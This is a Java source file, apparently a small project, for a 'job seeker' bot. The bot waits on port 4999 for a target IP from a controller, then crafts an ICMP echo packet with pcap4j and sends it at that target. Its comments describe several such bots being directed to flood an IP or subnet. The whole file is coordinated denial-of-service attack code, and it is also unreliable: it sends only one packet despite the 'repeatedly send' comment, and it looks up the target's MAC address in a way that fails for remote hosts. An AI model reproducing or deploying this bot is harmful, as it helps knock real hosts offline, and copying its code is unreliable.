import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.MacAddress;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;

/* The job creator ask more than one job seeker to execute an ICMP flood attack against a given IP or subnet.
    JobCreator get IP address from job creator, then create packet to repeatedly send to target.
 */
public class JobSeekerICMPAttack{ //server
    public static void main(String[] args) throws IOException, PcapNativeException {
        String targetIP = "0.0.0.0"; // dummy IP
        IcmpV4EchoPacket.Builder echoBuilder = new IcmpV4EchoPacket.Builder();
        echoBuilder
                .identifier((short) 1);

        IcmpV4CommonPacket.Builder icmpV4Builder = new IcmpV4CommonPacket.Builder();
        icmpV4Builder
                .type(IcmpV4Type.ECHO)
                .code(IcmpV4Code.NO_CODE)
                .payloadBuilder(echoBuilder)
                .correctChecksumAtBuild(true);
        //need to grab device IP and target IP
        Socket s;
        ServerSocket ss = new ServerSocket(4999);
        try {
            s = ss.accept();
            System.out.println("JobCreator connected. Waiting for Job...");
            InputStreamReader in = new InputStreamReader(s.getInputStream());
            BufferedReader bf = new BufferedReader(in);

            //get the target IP from jobCreator
            targetIP= bf.readLine();
            s.close();
        }catch(IOException ioe){
            System.out.println("Error. JobCreator disconnected.");
        }
        //*****
        IpV4Packet.Builder ipv4Builder = new IpV4Packet.Builder();
        try {
            ipv4Builder
                    .version(IpVersion.IPV4)
                    .tos(IpV4Rfc791Tos.newInstance((byte) 0))
                    .ttl((byte) 100)
                    .protocol(IpNumber.ICMPV4)
                    //servers IP and target IP
                    .srcAddr((Inet4Address) InetAddress.getLocalHost())
                    .dstAddr((Inet4Address) InetAddress.getByName(targetIP))
                    .payloadBuilder(icmpV4Builder)
                    .correctChecksumAtBuild(true)
                    .correctLengthAtBuild(true);
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        //get machine address
        InetAddress localHost = InetAddress.getLocalHost();
        NetworkInterface ni = NetworkInterface.getByInetAddress(localHost);
        byte[] hardwareAddress = ni.getHardwareAddress();
        //get target machine address
        InetAddress targetHost = InetAddress.getByName(targetIP);
        NetworkInterface tni = NetworkInterface.getByInetAddress(targetHost);
        byte[] thardwareAddress = tni.getHardwareAddress();

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder
                .srcAddr(MacAddress.getByAddress(hardwareAddress))
                .dstAddr(MacAddress.getByAddress(thardwareAddress))
                .type(EtherType.IPV4)
                .payloadBuilder(ipv4Builder)
                .paddingAtBuild(true);

        Packet p = etherBuilder.build();

        PcapNetworkInterface nif = Pcaps.getDevByAddress(localHost);
        int snapLen = 65536;
        PcapNetworkInterface.PromiscuousMode mode = PcapNetworkInterface.PromiscuousMode.PROMISCUOUS;
        int timeout = 10;
        PcapHandle handle = nif.openLive(snapLen, mode, timeout);
        try {
            handle.sendPacket(p);
        } catch (PcapNativeException | NotOpenException e) {
            e.printStackTrace();
        }
    }
}
